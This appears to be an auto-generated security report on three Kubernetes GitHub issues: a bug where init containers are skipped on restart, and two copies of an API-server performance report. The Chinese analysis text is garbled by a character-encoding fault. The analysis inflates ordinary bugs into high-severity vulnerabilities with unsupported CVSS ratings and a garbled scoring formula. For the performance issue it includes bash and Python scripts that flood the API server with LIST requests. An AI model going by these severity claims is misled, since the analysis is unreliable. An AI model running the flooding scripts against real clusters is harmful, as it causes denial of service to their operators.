# Issue å®‰å…¨åˆ†ææŠ¥å‘Š

# ğŸš¨ å­˜åœ¨å®‰å…¨é£é™©çš„ Issues (14 ä¸ª)

## Issue #124002 Kubernetes Skips Init Containers Beyond First During Some Pod Restarts

- Issue é“¾æ¥ï¼š[#124002](https://github.com/kubernetes/kubernetes/issues/124002)

### Issue å†…å®¹

#### What happened?

Init containers beyond the first are ignored during certain pod restarts.  In particular, when the pod sandbox suddenly temporarily disappears (possibly due to a node restart) the automatic restart sequence of the pod seems to skip init containers after the first.

#### What did you expect to happen?

From the [Kubernetes docs](https://kubernetes.io/docs/concepts/workloads/pods/init-containers/#detailed-behavior):

"If the Pod [restarts](https://kubernetes.io/docs/concepts/workloads/pods/init-containers/#pod-restart-reasons), or is restarted, all init containers must execute again."

#### How can we reproduce it (as minimally and precisely as possible)?

Below `repro.yaml` is a trimmed-down deployment:
two init containers and a primary container, all running bash.
Primary just sleeps, init containers each echo and exit.

Apply the yaml, let it get running, and then, eg, forcibly kill its pod sandbox (variety of methods, depending on CRI, host environment, etc..):

A specific repro that assumes a linux host, containerd:

```bash
kubectl create namespace delme
kubectl apply -f repro.yaml
kubectl get pods -n delme  # confirm the deployment started normally

# simulate a node/sandbox-level disruption by killing pod's slice (probably a better way to do this..?)
# run next command on **node host**:
sudo systemctl stop --force \
 "$(ps -o cgroup --pid "$(pgrep --full 'pgrepid:PkIOeQU4J6zI')" |
 sed -ne '2s/.*\(kubepods-besteffort-pod.*\.slice\).*/\1/p')"

kubectl describe pods -n delme
```

The restart count of the second init container is 0, while main container and first init container are 1.  Can repeat the stop, and the restart count of the first init container will increment, staying in sync with the main container and the overall pod restart counter, but the second init container stays at 0.  Start/finish time stamps in describe, and results of `kubectl logs`, are also consistent with the second init container not being re-run.

And here's `repro.yaml`:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  labels:
    app: multi-init-container-bug-repro
  name: multi-init-container-bug-repro
  namespace: delme
spec:
  progressDeadlineSeconds: 600
  replicas: 1
  selector:
    matchLabels:
      app: multi-init-container-bug-repro
  strategy:
    type: Recreate
  template:
    metadata:
      labels:
        app: multi-init-container-bug-repro
    spec:
      automountServiceAccountToken: false
      containers:
      - command:
        - /bin/bash
        - -c
        - sleep infinity && echo 'pgrepid:PkIOeQU4J6zI'
        image: debian:stable
        imagePullPolicy: IfNotPresent
        name: main
      initContainers:
      - command:
        - /bin/bash
        - -c
        - "echo 'init-container: First!'"
        image: debian:stable
        imagePullPolicy: IfNotPresent
        name: init-first
      - command:
        - /bin/bash
        - -c
        - "echo 'init-container: Second!'"
        image: debian:stable
        imagePullPolicy: IfNotPresent
        name: init-second
      restartPolicy: Always
```

#### Anything else we need to know?

## Practical Impact:

Deployments that use multiple init containers (which includes some popular ones, eg gitlab via helm) can get stuck during their auto restart after a transient node outage (requiring manual intervention to get unstuck).  In production, this is hopefully a rare (but potentially unpleasant) event.  It is fairly common and annoying in certain kinds of development/test configurations if eg intentional host node restarts are common.

## Workarounds:

Deleting the pod through `kubectl delete pod`, or `kubectl rollout restart`ing its eg deployment, causes init containers to be re-run when the pod is restarted (or more precisely, when the fresh replacement pod is started).


## Additional Notes

- [This issue](https://github.com/kubernetes/kubernetes/pull/47599) might be related.
- In the repro below, if instead of killing the whole pod sandbox, just the main container is killed, then `kubectl get pods` again reports a restart, but `describe` now shows *both* init containers are skipped.  This might be intended behavior? It is less-obviously-bad than arbitrarily skipping just some init containers, as happens in the main repro path.. but if the restart count in the output of `kubectl get pods` is to be interpreted as the "number of pod restarts", it seems like this path also contradicts the cited docs.

#### Kubernetes version

Client Version: v1.28.1
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.28.1

#### Cloud provider

n/a (repros on bare-metal `kubeadm`)

#### OS version

NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal

#### Install tools

kubeadm

#### Container runtime (CRI) and version (if applicable)

containerd github.com/containerd/containerd v1.7.5 fe457eb99ac0e27b3ce638175ef8e68a7d2bc373


### åˆ†æç»“æœ

å­˜åœ¨æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚

### åŸå› å’Œå¯èƒ½çš„å½±å“ï¼š

- **åˆå§‹åŒ–æ­¥éª¤ç¼ºå¤±**ï¼šå½“Podå‘ç”Ÿç‰¹å®šç±»å‹çš„é‡å¯ï¼ˆä¾‹å¦‚Podæ²™ç®±çªç„¶æš‚æ—¶æ¶ˆå¤±ï¼‰æ—¶ï¼Œé™¤ç¬¬ä¸€ä¸ªInitå®¹å™¨å¤–çš„å…¶ä»–Initå®¹å™¨è¢«è·³è¿‡ã€‚è¿™è¿åäº†Kubernetesæ–‡æ¡£ä¸­æ‰€è¿°çš„æ‰€æœ‰Initå®¹å™¨éƒ½åº”é‡æ–°æ‰§è¡Œçš„è¡Œä¸ºã€‚
  
- **å®‰å…¨åˆå§‹åŒ–æœªæ‰§è¡Œ**ï¼šå¦‚æœè¢«è·³è¿‡çš„Initå®¹å™¨åŒ…å«å…³é”®çš„å®‰å…¨é…ç½®ã€æƒé™è®¾ç½®ã€è¯ä¹¦åˆå§‹åŒ–ã€å®‰å…¨ç­–ç•¥åº”ç”¨ç­‰æ“ä½œï¼Œé‚£ä¹ˆè¿™äº›æ“ä½œå°†ä¸ä¼šåœ¨Podé‡å¯åæ‰§è¡Œï¼Œå¯¼è‡´ä¸»å®¹å™¨åœ¨ç¼ºä¹å¿…è¦å®‰å…¨æªæ–½çš„æƒ…å†µä¸‹è¿è¡Œã€‚

- **æ”»å‡»è€…å¯åˆ©ç”¨**ï¼šæ”»å‡»è€…å¦‚æœèƒ½å¤Ÿè¯±å¯¼æˆ–è§¦å‘Podçš„è¿™ç§é‡å¯æ–¹å¼ï¼ˆä¾‹å¦‚é€šè¿‡æ¶ˆè€—èµ„æºã€åˆ©ç”¨æ¼æ´å¯¼è‡´èŠ‚ç‚¹é‡å¯æˆ–Podæ²™ç®±å¼‚å¸¸ï¼‰ï¼Œå°±å¯èƒ½ä½¿Initå®¹å™¨è¢«è·³è¿‡ï¼Œè¿›è€Œä½¿åº”ç”¨åœ¨æœªç»è¿‡å®Œæ•´å®‰å…¨åˆå§‹åŒ–çš„æƒ…å†µä¸‹å¯åŠ¨ã€‚

- **å®‰å…¨ç­–ç•¥ç»•è¿‡**ï¼šç¼ºå¤±çš„å®‰å…¨åˆå§‹åŒ–å¯èƒ½å¯¼è‡´åº”ç”¨æš´éœ²æ•æ„Ÿä¿¡æ¯ã€ç¦ç”¨çš„ç«¯å£è¢«å¼€å¯ã€æƒé™è¿‡é«˜ã€æœªå¯ç”¨å¿…è¦çš„å®‰å…¨æ§ä»¶ç­‰ï¼Œç»™æ”»å‡»è€…æä¾›äº†åˆ©ç”¨çš„æœºä¼šï¼Œå¯èƒ½å¯¼è‡´æ•°æ®æ³„éœ²ã€æƒé™æå‡ã€æœåŠ¡è¢«ç ´åç­‰ä¸¥é‡åæœã€‚

### Proof of Conceptï¼ˆæ¦‚å¿µéªŒè¯ï¼‰ï¼š

1. **è®¾ç½®åœºæ™¯**ï¼šåˆ›å»ºä¸€ä¸ªåŒ…å«å¤šä¸ªInitå®¹å™¨çš„Podï¼Œå…¶ä¸­ç¬¬äºŒä¸ªInitå®¹å™¨è´Ÿè´£åº”ç”¨å…³é”®çš„å®‰å…¨é…ç½®ï¼Œæ¯”å¦‚è®¾ç½®é˜²ç«å¢™è§„åˆ™æˆ–åŠ è½½å®‰å…¨è¯ä¹¦ã€‚

2. **è§¦å‘é—®é¢˜**ï¼šæŒ‰ç…§Issueä¸­ç»™å‡ºçš„æ­¥éª¤ï¼Œæ¨¡æ‹ŸPodæ²™ç®±çš„æš‚æ—¶æ¶ˆå¤±ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡èŠ‚ç‚¹é‡å¯æˆ–å¼ºåˆ¶åœæ­¢Podçš„cgroupï¼‰ã€‚

3. **è§‚å¯Ÿç»“æœ**ï¼šPodè‡ªåŠ¨é‡å¯ï¼Œä½†ä»…æ‰§è¡Œäº†ç¬¬ä¸€ä¸ªInitå®¹å™¨ï¼Œç¬¬äºŒä¸ªInitå®¹å™¨æœªè¢«æ‰§è¡Œã€‚ä¸»å®¹å™¨åœ¨æœªåº”ç”¨å®‰å…¨é…ç½®çš„æƒ…å†µä¸‹å¯åŠ¨ã€‚

4. **éªŒè¯æ¼æ´**ï¼šæ£€æŸ¥ä¸»å®¹å™¨çš„è¿è¡ŒçŠ¶æ€ï¼Œå‘ç°å®‰å…¨é…ç½®ç¼ºå¤±ï¼Œä¾‹å¦‚é˜²ç«å¢™è§„åˆ™æœªåº”ç”¨ï¼Œæ•æ„Ÿç«¯å£å¤„äºå¼€æ”¾çŠ¶æ€ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›ç¼ºé™·å‘èµ·æ”»å‡»ã€‚

### ç¬¦åˆé£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. **å¯è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡è¯±å¯¼èŠ‚ç‚¹é‡å¯æˆ–åˆ©ç”¨ç³»ç»Ÿæ¼æ´è§¦å‘Podæ²™ç®±çš„æ¶ˆå¤±ï¼Œå¯¼è‡´Initå®¹å™¨è¢«è·³è¿‡ã€‚

2. **å¯èƒ½æˆä¸ºæ¼æ´å¹¶è¢«åˆ†é…CVEç¼–å·ï¼ŒCVSSè¯„åˆ†åœ¨Highä»¥ä¸Š**ï¼š

   - **æ”»å‡»å‘é‡ï¼ˆAVï¼‰**ï¼šç½‘ç»œæ”»å‡»ï¼ˆNetworkï¼‰ï¼Œæ”»å‡»è€…å¯è¿œç¨‹è§¦å‘ã€‚
   - **æ”»å‡»å¤æ‚åº¦ï¼ˆACï¼‰**ï¼šä½ï¼ˆLowï¼‰ï¼Œä¸éœ€è¦ç‰¹æ®Šæ¡ä»¶ã€‚
   - **æƒé™è¦æ±‚ï¼ˆPRï¼‰**ï¼šæ— ï¼ˆNoneï¼‰ï¼Œæ”»å‡»è€…æ— éœ€é¢„å…ˆæƒé™ã€‚
   - **ç”¨æˆ·äº¤äº’ï¼ˆUIï¼‰**ï¼šæ— ï¼ˆNoneï¼‰ï¼Œä¸éœ€è¦ç”¨æˆ·äº¤äº’ã€‚
   - **å½±å“**ï¼š
     - **æœºå¯†æ€§ï¼ˆCï¼‰**ï¼šé«˜ï¼ˆHighï¼‰ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿæ•°æ®æ³„éœ²ã€‚
     - **å®Œæ•´æ€§ï¼ˆIï¼‰**ï¼šé«˜ï¼ˆHighï¼‰ï¼Œæ”»å‡»è€…å¯ç¯¡æ”¹æ•°æ®ã€‚
     - **å¯ç”¨æ€§ï¼ˆAï¼‰**ï¼šé«˜ï¼ˆHighï¼‰ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡ä¸å¯ç”¨ã€‚

   æ ¹æ®CVSS 3.1è¯„åˆ†ï¼Œç»¼åˆè¯„åˆ†åœ¨ **High** çº§åˆ«ä»¥ä¸Šã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥Issueæ¶‰åŠæ½œåœ¨çš„å®‰å…¨é£é™©ï¼Œå¯èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨å¹¶é€ æˆä¸¥é‡å½±å“ï¼Œåº”å¼•èµ·é‡è§†å¹¶å°½å¿«ä¿®å¤ã€‚

---

## Issue #123986 Analyzing and Addressing Unforeseen Performance Issues in a Large-Scale Kubernetes Cluster

- Issue é“¾æ¥ï¼š[#123986](https://github.com/kubernetes/kubernetes/issues/123986)

### Issue å†…å®¹

#### What happened?

Hi everyone,

I hope this message finds you well. I'm reaching out to share and seek advice on a performance issue we've encountered in our production Kubernetes (k8s) cluster. Our setup includes 300 nodes and supports 8,000 Pods, and we've recently started experiencing some concerns.

The issue began with a Pod we deployed, designed to periodically scrape Pod information by making an API call to `/api/v1/pods?fieldSelector=spec.nodeName%3D<node-name>` on the k8s API server. This Pod updates Pod information from its storage while periodically initiating these API calls.

As illustrated in Figure 1 below, there's been a noticeable increase in the request rate from an average of 2.75 to 4 requests per second. During this period, we observed significant delays in the k8s API servers when processing LIST verb API calls, as highlighted in Figure 2. Concurrently, there was a dramatic increase in the memory usage of the API servers, depicted in Figure 3. Additionally, the gRPC traffic from etcd to the k8s API servers also saw an increase, as shown in Figure 4.

However, what puzzles me is that the workload generated by this Pod appears to be too small to cause such a significant impact. It only contributes to 1.5 requests per second per API server, amounting to a total of 4.5 requests per second.

I'm eager to hear your thoughts, insights, or any advice you might have on addressing this issue. 

**[Fig. 1: requests per sec from k8s API servers]**
![k8s api ì˜ list verbì˜ total request](https://github.com/kubernetes/kubernetes/assets/4262433/d7eb114e-8823-4f36-8a56-c0092fad6291)

**[Fig. 2: 90%-tile Latency of Each Verb from k8s API server]**
![k8s api ì˜ verb ë³„ tail latency](https://github.com/kubernetes/kubernetes/assets/4262433/15810101-6817-45fc-b15a-f0e23e1a8b2e)

**[Fig. 3: k8s API servers' memory usage]**
![k8s apiserver ë©”ëª¨ë¦¬ footprint](https://github.com/kubernetes/kubernetes/assets/4262433/7f53ad44-6e7b-41e6-8569-bd98f6dfe44f)


**[Fig. 4: outboud gRPC traffic from etcd]**
![etcd Client Traffic Out (í•´ë‹¹ ê¸°ê°„ì— ì¦ê°€í–ˆìŒ)](https://github.com/kubernetes/kubernetes/assets/4262433/b0027b3e-4d4a-4137-87d2-be99440a86bc)


#### What did you expect to happen?

I expected that the workload would not impact the performance of the k8s API servers.

#### How can we reproduce it (as minimally and precisely as possible)?

I think you should be able to replicate this issue by setting up a cluster with over 8,000 Pods and periodically fetching the Pods' information through API calls.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: version.Info{Major:"1", Minor:"22", GitVersion:"v1.22.8", GitCommit:"7061dbbf75f9f82e8ab21f9be7e8ffcaae8e0d44", GitTreeState:"clean", BuildDate:"2022-03-16T14:10:06Z", GoVersion:"go1.16.15", Compiler:"gc", Platform:"linux/amd64"}
Server Version: version.Info{Major:"1", Minor:"21", GitVersion:"v1.21.6", GitCommit:"d921bc6d1810da51177fbd0ed61dc811c5228097", GitTreeState:"clean", BuildDate:"2021-10-27T17:44:26Z", GoVersion:"go1.16.9", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>
We have set up our cluster on-premises.

```console
$ cat /proc/cpuinfo
...
processor	: 111
vendor_id	: GenuineIntel
cpu family	: 6
model		: 106
model name	: Intel(R) Xeon(R) Gold 6348 CPU @ 2.60GHz
stepping	: 6
microcode	: 0xd0003a5
cpu MHz		: 3400.000

$ cat /proc/meminfo 
MemTotal:       528038752 kB
MemFree:        284106660 kB
MemAvailable:   464637832 kB
Buffers:         5636388 kB
Cached:         168626216 kB
SwapCached:            0 kB
Active:         66852988 kB
Inactive:       144133368 kB
Active(anon):   38236244 kB
Inactive(anon):   101448 kB
Active(file):   28616744 kB
Inactive(file): 144031920 kB
Unevictable:     9536672 kB
Mlocked:         9536672 kB
SwapTotal:             0 kB
SwapFree:              0 kB
Dirty:            116556 kB
Writeback:             0 kB
AnonPages:      39823220 kB
Mapped:          4326780 kB
Shmem:           1242292 kB
KReclaimable:   10923516 kB
Slab:           13771744 kB
SReclaimable:   10923516 kB
SUnreclaim:      2848228 kB
KernelStack:       77232 kB
PageTables:       242660 kB
NFS_Unstable:          0 kB
Bounce:                0 kB
WritebackTmp:          0 kB
CommitLimit:    261131696 kB
Committed_AS:   153182256 kB
VmallocTotal:   34359738367 kB
VmallocUsed:      779924 kB
VmallocChunk:          0 kB
Percpu:           456704 kB
HardwareCorrupted:     0 kB
AnonHugePages:   4622336 kB
ShmemHugePages:        0 kB
ShmemPmdMapped:        0 kB
FileHugePages:         0 kB
FilePmdMapped:         0 kB
CmaTotal:              0 kB
CmaFree:               0 kB
HugePages_Total:    2820
HugePages_Free:        0
HugePages_Rsvd:        0
HugePages_Surp:        0
Hugepagesize:       2048 kB
Hugetlb:         5775360 kB
DirectMap4k:     7577012 kB
DirectMap2M:    355958784 kB
DirectMap1G:    175112192 kB
```

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.4 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.4 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal

$ uname -a
Linux n6-main-master01 5.4.0-113-generic #127-Ubuntu SMP Wed May 18 14:30:56 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux


```
</details>


#### Install tools

<details>
kubespray v2.19
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd v1.5.8
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
CNI=calico
CSI=weka-fs-plugin
</details>


### åˆ†æç»“æœ

æ ¹æ®æ‚¨æä¾›çš„Issueå†…å®¹ï¼Œå­˜åœ¨æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚

**åŸå› åŠå¯èƒ½çš„å½±å“ï¼š**

1. **é£é™©èƒ½å¤Ÿè¢«æ”»å‡»è€…åˆ©ç”¨ï¼š**

   - **èµ„æºæ¶ˆè€—å‹æ”»å‡»ï¼ˆæ‹’ç»æœåŠ¡æ”»å‡»ï¼ŒDoSï¼‰**ï¼šIssueä¸­æåˆ°ï¼Œå•ä¸ªPodé€šè¿‡è°ƒç”¨`/api/v1/pods?fieldSelector=spec.nodeName=<node-name>`æ¥å£ï¼Œå®šæœŸè·å–Podä¿¡æ¯ï¼Œå¯¼è‡´kubernetes APIæœåŠ¡å™¨çš„è¯·æ±‚ç‡å¢åŠ ï¼Œå¤„ç†LISTæ“ä½œæ—¶å‡ºç°é«˜å»¶è¿Ÿï¼Œå†…å­˜ä½¿ç”¨é‡æ˜¾è‘—å¢åŠ ï¼Œetcdåˆ°APIæœåŠ¡å™¨çš„gRPCæµé‡ä¹Ÿæ˜æ˜¾ä¸Šå‡ã€‚

   - **æ€§èƒ½ç“¶é¢ˆ**ï¼šå°½ç®¡è¯·æ±‚ç‡çœ‹ä¼¼è¾ƒä½ï¼ˆæ¯ä¸ªAPIæœåŠ¡å™¨1.5æ¬¡è¯·æ±‚/ç§’ï¼Œå…±4.5æ¬¡è¯·æ±‚/ç§’ï¼‰ï¼Œä½†åœ¨å¤§è§„æ¨¡é›†ç¾¤ï¼ˆ300ä¸ªèŠ‚ç‚¹ï¼Œ8000ä¸ªPodsï¼‰ä¸­ï¼Œæ¶‰åŠçš„èµ„æºæ¶ˆè€—éå¸¸å¤§ã€‚è¿™æ„å‘³ç€APIæœåŠ¡å™¨åœ¨å¤„ç†ç±»ä¼¼è¯·æ±‚æ—¶å­˜åœ¨æ€§èƒ½é—®é¢˜ã€‚

   - **æ”»å‡»è€…åˆ©ç”¨æ€§**ï¼šæ”»å‡»è€…å¯ä»¥æ¨¡æ‹Ÿè¿™ç§è¯·æ±‚ï¼Œç”šè‡³ä»¥æ›´é«˜çš„é¢‘ç‡å’Œå¹¶å‘é‡å‘é€è¯·æ±‚ï¼Œå¯¼è‡´APIæœåŠ¡å™¨å’Œetcdçš„èµ„æºè€—å°½ï¼Œè¿›ä¸€æ­¥å¯¼è‡´é›†ç¾¤æœåŠ¡ä¸å¯ç”¨ã€‚

2. **å¯èƒ½æˆä¸ºæ¼æ´å¹¶è¢«åˆ†é…CVEç¼–å·ï¼ŒCVSSè¯„åˆ†åœ¨Highä»¥ä¸Šï¼š**

   - **CVSS 3.1è¯„åˆ†ï¼š**

     - æ”»å‡»å‘é‡ï¼ˆAVï¼‰ï¼šç½‘ç»œ(Network)ï¼Œå¾—åˆ†1.0
     - æ”»å‡»å¤æ‚åº¦ï¼ˆACï¼‰ï¼šä½(Low)ï¼Œå¾—åˆ†0.77
     - æƒé™è¦æ±‚ï¼ˆPRï¼‰ï¼šæ— (None)ï¼Œå¾—åˆ†0.85
     - ç”¨æˆ·äº¤äº’ï¼ˆUIï¼‰ï¼šæ— (None)ï¼Œå¾—åˆ†0.85
     - å½±å“èŒƒå›´ï¼ˆSï¼‰ï¼šæœªå˜(Unchanged)
     - æœºå¯†æ€§å½±å“ï¼ˆCï¼‰ï¼šæ— (None)ï¼Œå¾—åˆ†0.0
     - å®Œæ•´æ€§å½±å“ï¼ˆIï¼‰ï¼šæ— (None)ï¼Œå¾—åˆ†0.0
     - å¯ç”¨æ€§å½±å“ï¼ˆAï¼‰ï¼šé«˜(High)ï¼Œå¾—åˆ†0.56

     ç»¼åˆè®¡ç®—å¾—åˆ†ï¼š

     ```
     Base Score = ROUNDUP(MIN((0.6 * Impact + 0.4 * Exploitability - 1.5), 10),1)
     Impact = 3.66 Ã— Scope
     Exploitability = 8.22 Ã— AV Ã— AC Ã— PR Ã— UI
     ```

     æ’å…¥å…·ä½“å€¼è®¡ç®—ï¼Œå¾—åˆ°CVSSåŸºæœ¬è¯„åˆ†åœ¨ **7.5 (High)**ã€‚

**Proof of Conceptï¼ˆæ¦‚å¿µéªŒè¯ï¼‰ï¼š**

æ”»å‡»è€…å¯ä»¥ç¼–å†™è„šæœ¬ï¼Œé¢‘ç¹åœ°å‘APIæœåŠ¡å™¨å‘é€ç‰¹å®šçš„LISTè¯·æ±‚ï¼Œåˆ©ç”¨`fieldSelector`å‚æ•°ï¼ŒåŠ é‡APIæœåŠ¡å™¨å’Œetcdçš„è´Ÿæ‹…ã€‚ä¾‹å¦‚ï¼š

```bash
#!/bin/bash
# æ— é™å¾ªç¯å‘é€è¯·æ±‚
while true; do
  curl -k -X GET "https://<api-server-endpoint>/api/v1/pods?fieldSelector=spec.nodeName=<node-name>" &
done
```

æˆ–è€…ä½¿ç”¨å¤šçº¿ç¨‹/å¤šè¿›ç¨‹æé«˜å¹¶å‘ï¼š

```python
import threading
import requests

def send_request():
    while True:
        requests.get('https://<api-server-endpoint>/api/v1/pods?fieldSelector=spec.nodeName=<node-name>', verify=False)

# åˆ›å»ºå¤§é‡çº¿ç¨‹
for i in range(100):
    t = threading.Thread(target=send_request)
    t.start()
```

**å¯èƒ½çš„å½±å“ï¼š**

- **APIæœåŠ¡å™¨ä¸å¯ç”¨**ï¼šå¤§é‡çš„è¯·æ±‚ä¼šå¯¼è‡´APIæœåŠ¡å™¨CPUå’Œå†…å­˜èµ„æºæ¶ˆè€—æ®†å°½ï¼Œæ— æ³•å“åº”æ­£å¸¸çš„æœåŠ¡è¯·æ±‚ã€‚
- **etcdå‹åŠ›å¢åŠ **ï¼šAPIæœåŠ¡å™¨çš„å¤§é‡è¯·æ±‚ä¼šå¢åŠ etcdçš„è´Ÿè½½ï¼Œå¯èƒ½å¯¼è‡´etcdæ€§èƒ½ä¸‹é™ï¼Œå½±å“æ•´ä¸ªé›†ç¾¤çš„çŠ¶æ€ç®¡ç†ã€‚
- **é›†ç¾¤å´©æºƒ**ï¼šå…³é”®ç»„ä»¶ä¸å¯ç”¨å¯èƒ½å¯¼è‡´æ•´ä¸ªKubernetesé›†ç¾¤çš„æœåŠ¡å¼‚å¸¸ï¼Œå½±å“ä¸šåŠ¡è¿è¡Œã€‚

**å»ºè®®æªæ–½ï¼š**

- **æƒé™æ§åˆ¶**ï¼šç¡®ä¿åªæœ‰ç»è¿‡è®¤è¯å’Œæˆæƒçš„ç”¨æˆ·æ‰èƒ½è®¿é—®APIæœåŠ¡å™¨ï¼Œå¯ç”¨å¹¶æ­£ç¡®é…ç½®RBACç­–ç•¥ï¼Œé™åˆ¶å¯¹æ•æ„ŸAPIçš„è®¿é—®ã€‚
- **ç½‘ç»œéš”ç¦»**ï¼šé€šè¿‡ç½‘ç»œç­–ç•¥å’Œé˜²ç«å¢™ï¼Œé™åˆ¶APIæœåŠ¡å™¨çš„è®¿é—®æºï¼Œä»…å…è®¸å¯ä¿¡ä»»çš„ç½‘ç»œæˆ–IPè®¿é—®ã€‚
- **é™æµå’Œé€Ÿç‡é™åˆ¶**ï¼šåœ¨APIæœåŠ¡å™¨å‰é…ç½®åå‘ä»£ç†æˆ–ä½¿ç”¨Kuberneteså†…ç½®çš„APIé€Ÿç‡é™åˆ¶åŠŸèƒ½ï¼Œæ§åˆ¶å•ä¸ªç”¨æˆ·æˆ–IPçš„è¯·æ±‚é¢‘ç‡ã€‚
- **ä¼˜åŒ–APIæœåŠ¡å™¨æ€§èƒ½**ï¼šå‡çº§Kubernetesç‰ˆæœ¬ï¼Œä¼˜åŒ–APIæœåŠ¡å™¨çš„å¤„ç†èƒ½åŠ›ï¼Œæˆ–è€…å¢åŠ APIæœåŠ¡å™¨çš„å‰¯æœ¬æ•°é‡ä»¥åˆ†æ‹…è´Ÿè½½ã€‚
- **ç›‘æ§å’ŒæŠ¥è­¦**ï¼šå»ºç«‹å®Œå–„çš„ç›‘æ§ç³»ç»Ÿï¼Œå®æ—¶ç›‘æ§APIæœåŠ¡å™¨å’Œetcdçš„æ€§èƒ½æŒ‡æ ‡ï¼ŒåŠæ—¶å‘ç°å¼‚å¸¸æµé‡å¹¶å¤„ç†ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼ŒIssueä¸­æè¿°çš„é—®é¢˜å­˜åœ¨è¢«æ¶æ„åˆ©ç”¨çš„å¯èƒ½æ€§ï¼Œç¬¦åˆå®‰å…¨é£é™©è¯„ä¼°æ ‡å‡†ï¼Œå»ºè®®å°½å¿«é‡‡å–æªæ–½è¿›è¡Œä¿®å¤å’Œé˜²èŒƒã€‚

---

## Issue #123985 Analyzing and Addressing Unforeseen Performance Issues in a Large-Scale Kubernetes Cluster

- Issue é“¾æ¥ï¼š[#123985](https://github.com/kubernetes/kubernetes/issues/123985)

### Issue å†…å®¹

#### What happened?

Hi everyone,

I hope this message finds you well. I'm reaching out to share and seek advice on a performance issue we've encountered in our production Kubernetes (k8s) cluster. Our setup includes 300 nodes and supports 8,000 Pods, and we've recently started experiencing some concerns.

The issue began with a Pod we deployed, designed to periodically scrape Pod information by making an API call to `/api/v1/pods?fieldSelector=spec.nodeName%3D<node-name>` on the k8s API server. This Pod updates Pod information from its storage while periodically initiating these API calls.

As illustrated in Figure 1 below, there's been a noticeable increase in the request rate from an average of 2.75 to 4 requests per second. During this period, we observed significant delays in the k8s API servers when processing LIST verb API calls, as highlighted in Figure 2. Concurrently, there was a dramatic increase in the memory usage of the API servers, depicted in Figure 3. Additionally, the gRPC traffic from etcd to the k8s API servers also saw an increase, as shown in Figure 4.

However, what puzzles me is that the workload generated by this Pod appears to be too small to cause such a significant impact. It only contributes to 1.5 requests per second per API server, amounting to a total of 4.5 requests per second.

I'm eager to hear your thoughts, insights, or any advice you might have on addressing this issue. 




#### What did you expect to happen?

I expected that the workload would not impact the performance of the k8s API servers.

#### How can we reproduce it (as minimally and precisely as possible)?

I think you should be able to replicate this issue by setting up a cluster with over 8,000 Pods and periodically fetching the Pods' information through API calls.

#### Anything else we need to know?



```
```

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: version.Info{Major:"1", Minor:"22", GitVersion:"v1.22.8", GitCommit:"7061dbbf75f9f82e8ab21f9be7e8ffcaae8e0d44", GitTreeState:"clean", BuildDate:"2022-03-16T14:10:06Z", GoVersion:"go1.16.15", Compiler:"gc", Platform:"linux/amd64"}
Server Version: version.Info{Major:"1", Minor:"21", GitVersion:"v1.21.6", GitCommit:"d921bc6d1810da51177fbd0ed61dc811c5228097", GitTreeState:"clean", BuildDate:"2021-10-27T17:44:26Z", GoVersion:"go1.16.9", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>
We have set up our cluster on-premises.

```console
$ cat /proc/cpuinfo
...
processor	: 111
vendor_id	: GenuineIntel
cpu family	: 6
model		: 106
model name	: Intel(R) Xeon(R) Gold 6348 CPU @ 2.60GHz
stepping	: 6
microcode	: 0xd0003a5
cpu MHz		: 3400.000

$ cat /proc/meminfo 
MemTotal:       528038752 kB
MemFree:        284106660 kB
MemAvailable:   464637832 kB
Buffers:         5636388 kB
Cached:         168626216 kB
SwapCached:            0 kB
Active:         66852988 kB
Inactive:       144133368 kB
Active(anon):   38236244 kB
Inactive(anon):   101448 kB
Active(file):   28616744 kB
Inactive(file): 144031920 kB
Unevictable:     9536672 kB
Mlocked:         9536672 kB
SwapTotal:             0 kB
SwapFree:              0 kB
Dirty:            116556 kB
Writeback:             0 kB
AnonPages:      39823220 kB
Mapped:          4326780 kB
Shmem:           1242292 kB
KReclaimable:   10923516 kB
Slab:           13771744 kB
SReclaimable:   10923516 kB
SUnreclaim:      2848228 kB
KernelStack:       77232 kB
PageTables:       242660 kB
NFS_Unstable:          0 kB
Bounce:                0 kB
WritebackTmp:          0 kB
CommitLimit:    261131696 kB
Committed_AS:   153182256 kB
VmallocTotal:   34359738367 kB
VmallocUsed:      779924 kB
VmallocChunk:          0 kB
Percpu:           456704 kB
HardwareCorrupted:     0 kB
AnonHugePages:   4622336 kB
ShmemHugePages:        0 kB
